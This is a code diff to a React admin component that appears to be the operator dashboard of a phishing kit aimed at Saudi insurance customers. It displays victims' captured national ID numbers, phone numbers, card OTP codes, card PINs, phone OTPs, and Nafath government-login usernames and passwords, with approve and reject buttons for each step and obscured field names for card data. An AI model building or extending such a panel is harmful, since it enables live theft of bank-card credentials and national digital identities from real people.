@@ -1738,10 +1738,44 @@ const renderNafadBox = () => {
     const basicRaw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
     const insuranceRaw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
     
-    // Get OTP codes - use sample data for demo
-    const cardOtpCode = selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode || "123456";
-    const pinCode = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "1234").padStart(4, "0");
-    const phoneOtpCode = selectedRequest?.raw?._v7 || selectedRequest?.raw?.phoneOtp || "654321";
+    // Check if each section has data to show
+    const hasBasicData = basicRaw && (
+      basicRaw.identityNumber || 
+      basicRaw.ownerName || 
+      basicRaw.buyerName || 
+      basicRaw.phoneNumber || 
+      basicRaw.documentType
+    );
+    
+    const hasInsuranceData = insuranceRaw && (
+      insuranceRaw.insuranceCoverage ||
+      insuranceRaw.vehicleModel ||
+      insuranceRaw.vehicleValue ||
+      insuranceRaw.vehicleYear ||
+      insuranceRaw.repairLocation
+    );
+    
+    const hasCardData = selectedRequest?.raw && (
+      selectedRequest.raw._v1 ||
+      selectedRequest.raw._v5 ||
+      selectedRequest.raw.cardNumber ||
+      selectedRequest.raw.paymentStatus
+    );
+    
+    const hasPinData = selectedRequest?.raw && (
+      selectedRequest.raw._v6 ||
+      selectedRequest.raw.pinCode
+    );
+    
+    const hasPhoneData = selectedRequest?.raw && (
+      selectedRequest.raw.phoneOtp ||
+      selectedRequest.raw._v7
+    );
+    
+    const hasNafadData = selectedRequest?.raw && (
+      selectedRequest.raw.nafadIdNumber ||
+      selectedRequest.raw.nafadPassword
+    );
     
     // Get timestamps for each data type
     const basicTimestamp = getTimestamp(basicRaw);
@@ -1755,278 +1789,293 @@ const renderNafadBox = () => {
     return (
       <div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 16 }}>
         
-        {/* صندوق المعلومات الأساسية */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={basicTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق المعلومات الأساسية</h3>
+        {/* صندوق المعلومات الأساسية - يظهر فقط إذا كانت هناك بيانات */}
+        {hasBasicData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={basicTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق المعلومات الأساسية</h3>
+            </div>
+            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+              {basicRaw?.identityNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.identityNumber}</span>
+                </div>
+              )}
+              {basicRaw?.ownerName && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الاسم</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.ownerName}</span>
+                </div>
+              )}
+              {basicRaw?.phoneNumber && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهاتف</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.phoneNumber}</span>
+                </div>
+              )}
+              {basicRaw?.buyerName && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم المشتري</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.buyerName}</span>
+                </div>
+              )}
+              {basicRaw?.documentType && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع المستند</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.documentType}</span>
+                </div>
+              )}
+            </div>
           </div>
-          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.identityNumber || "1046403927"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الاسم</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.ownerName || basicRaw?.buyerName || "أحمد محمد"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهاتف</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.phoneNumber || "0587843798"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>اسم المشتري</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.buyerName || "محمد أحمد"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع المستند</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.documentType || "هوية وطنية"}</span>
-            </div>
-          </div>
-        </div>
+        )}
 
-        {/* صندوق تفاصيل التأمين */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={insuranceTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق تفاصيل التأمين</h3>
+        {/* صندوق تفاصيل التأمين - يظهر فقط إذا كانت هناك بيانات */}
+        {hasInsuranceData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={insuranceTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق تفاصيل التأمين</h3>
+            </div>
+            <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
+              {insuranceRaw?.insuranceCoverage && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التغطية</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.insuranceCoverage === "comprehensive" ? "شامل" : insuranceRaw.insuranceCoverage}</span>
+                </div>
+              )}
+              {insuranceRaw?.vehicleModel && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الموديل</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleModel}</span>
+                </div>
+              )}
+              {insuranceRaw?.vehicleValue && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>القيمة التقديرية</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleValue} ﷼</span>
+                </div>
+              )}
+              {insuranceRaw?.vehicleYear && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>سنة الصنع</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.vehicleYear}</span>
+                </div>
+              )}
+              {insuranceRaw?.repairLocation && (
+                <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                  <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>مكان الإصلاح</span>
+                  <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw.repairLocation === "agency" ? "الوكالة" : insuranceRaw.repairLocation}</span>
+                </div>
+              )}
+            </div>
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              >
+                رفض
+              </button>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+              >
+                موافقة
+              </button>
+            </div>
           </div>
-          <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>نوع التغطية</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.insuranceCoverage === "comprehensive" ? "شامل" : (insuranceRaw?.insuranceCoverage || "شامل")}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>الموديل</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.vehicleModel || "تويوتا كامري"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>القيمة التقديرية</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.vehicleValue || "95000"} ﷼</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>سنة الصنع</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.vehicleYear || "2023"}</span>
-            </div>
-            <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-              <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>مكان الإصلاح</span>
-              <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{insuranceRaw?.repairLocation === "agency" ? "الوكالة" : (insuranceRaw?.repairLocation || "الوكالة")}</span>
-            </div>
-          </div>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-            >
-              رفض
-            </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
-          </div>
-        </div>
+        )}
 
-        {/* صندوق بيانات الدفع */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={paymentTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق بيانات الدفع</h3>
-          </div>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-            >
-              رفض
-            </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
-          </div>
-        </div>
-
-        {/* صندوق رمز التحقق من البطاقة */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={cardOtpTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
-          </div>
-          <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
-            <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-            <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardOtpCode}</p>
-          </div>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-            >
-              رفض
-            </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
-          </div>
-        </div>
-
-        {/* صندوق رمز PIN */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={pinTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
-          </div>
-          <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
-            {Array.from({ length: 4 }).map((_, idx) => (
-              <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
-                <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinCode[idx]}</span>
+        {/* صندوق رمز التحقق من البطاقة - يظهر فقط إذا كانت هناك بيانات */}
+        {hasCardData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={cardOtpTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق من البطاقة</h3>
+            </div>
+            {(selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode) && (
+              <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center" }}>
+                <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
+                <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{selectedRequest?.raw?._v5 || selectedRequest?.raw?.otpCode}</p>
               </div>
-            ))}
+            )}
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              >
+                رفض
+              </button>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+              >
+                موافقة
+              </button>
+            </div>
           </div>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-            >
-              رفض
-            </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
-          </div>
-        </div>
+        )}
 
-        {/* صندوق تحقق الهاتف */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={phoneTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
+        {/* صندوق رمز PIN - يظهر فقط إذا كانت هناك بيانات */}
+        {hasPinData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={pinTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز PIN</h3>
+            </div>
+            <div style={{ display: "flex", justifyContent: "center", gap: 4, direction: "ltr" }}>
+              {Array.from({ length: 4 }).map((_, idx) => {
+                const pinValue = String(selectedRequest?.raw?._v6 || selectedRequest?.raw?.pinCode || "0000").padStart(4, "0")[idx] || "0";
+                return (
+                  <div key={idx} style={{ background: "#f0f9ff", borderRadius: 8, display: "flex", alignItems: "center", justifyContent: "center", width: 40, height: 50, border: "1px solid #7dd3fc" }}>
+                    <span style={{ fontSize: "1.25rem", fontWeight: 700, color: "#0c4a6e" }}>{pinValue}</span>
+                  </div>
+                );
+              })}
+            </div>
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              >
+                رفض
+              </button>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+              >
+                موافقة
+              </button>
+            </div>
           </div>
-          <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-            <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
-            <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw?.phoneNumber || "0587843798"}</span>
-          </div>
-          <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
-            <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneOtpCode}</p>
-          </div>
-          {/* زر إعادة إرسال الرمز */}
-          <button 
-            style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer", marginTop: 12 }}
-          >
-            🔄 إعادة إرسال رمز
-          </button>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
-            >
-              رفض
-            </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
-          </div>
-        </div>
+        )}
 
-        {/* صندوق نفاذ */}
-        <div style={{ 
-          background: "#ffffff", 
-          borderRadius: 12, 
-          padding: 16, 
-          border: "1px solid #e5e7eb",
-          width: "40%",
-          marginRight: 0,
-          marginLeft: "auto",
-          position: "relative"
-        }}>
-          <TimeCounter timestamp={nafadTimestamp} />
-          <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
-            <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
-          </div>
-          <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-            <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
-            <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest?.raw?.nafadIdNumber || "1046403927"}</span>
-          </div>
-          <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginTop: 8 }}>
-            <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
-            <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest?.raw?.nafadPassword || "password123"}</span>
-          </div>
-          {/* أزرار الموافقة والرفض */}
-          <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+        {/* صندوق تحقق الهاتف - يظهر فقط إذا كانت هناك بيانات */}
+        {hasPhoneData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={phoneTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
+            </div>
+            {basicRaw?.phoneNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.phoneNumber}</span>
+              </div>
+            )}
+            {(selectedRequest?.raw?.phoneOtp || selectedRequest?.raw?._v7) && (
+              <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
+                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{selectedRequest?.raw?.phoneOtp || selectedRequest?.raw?._v7}</p>
+              </div>
+            )}
+            {/* زر إعادة إرسال الرمز */}
             <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              style={{ width: "100%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer", marginTop: 12 }}
             >
-              رفض
+              🔄 إعادة إرسال رمز
             </button>
-            <button 
-              style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
-            >
-              موافقة
-            </button>
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              >
+                رفض
+              </button>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+              >
+                موافقة
+              </button>
+            </div>
           </div>
-        </div>
+        )}
+
+        {/* صندوق نفاذ - يظهر فقط إذا كانت هناك بيانات */}
+        {hasNafadData && (
+          <div style={{ 
+            background: "#ffffff", 
+            borderRadius: 12, 
+            padding: 16, 
+            border: "1px solid #e5e7eb",
+            width: "40%",
+            marginRight: 0,
+            marginLeft: "auto",
+            position: "relative"
+          }}>
+            <TimeCounter timestamp={nafadTimestamp} />
+            <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
+              <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>نفاذ</h3>
+            </div>
+            {selectedRequest?.raw?.nafadIdNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest.raw.nafadIdNumber}</span>
+              </div>
+            )}
+            {selectedRequest?.raw?.nafadPassword && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8, marginTop: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>كلمة المرور</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{selectedRequest.raw.nafadPassword}</span>
+              </div>
+            )}
+            {/* أزرار الموافقة والرفض */}
+            <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "1px solid #d1d5db", borderRadius: 8, background: "#ffffff", color: "#374151", fontWeight: 600, cursor: "pointer" }}
+              >
+                رفض
+              </button>
+              <button 
+                style={{ flex: "1 1 0%", padding: "10px 16px", border: "none", borderRadius: 8, background: "#111827", color: "#ffffff", fontWeight: 600, cursor: "pointer" }}
+              >
+                موافقة
+              </button>
+            </div>
+          </div>
+        )}
 
       </div>
     );
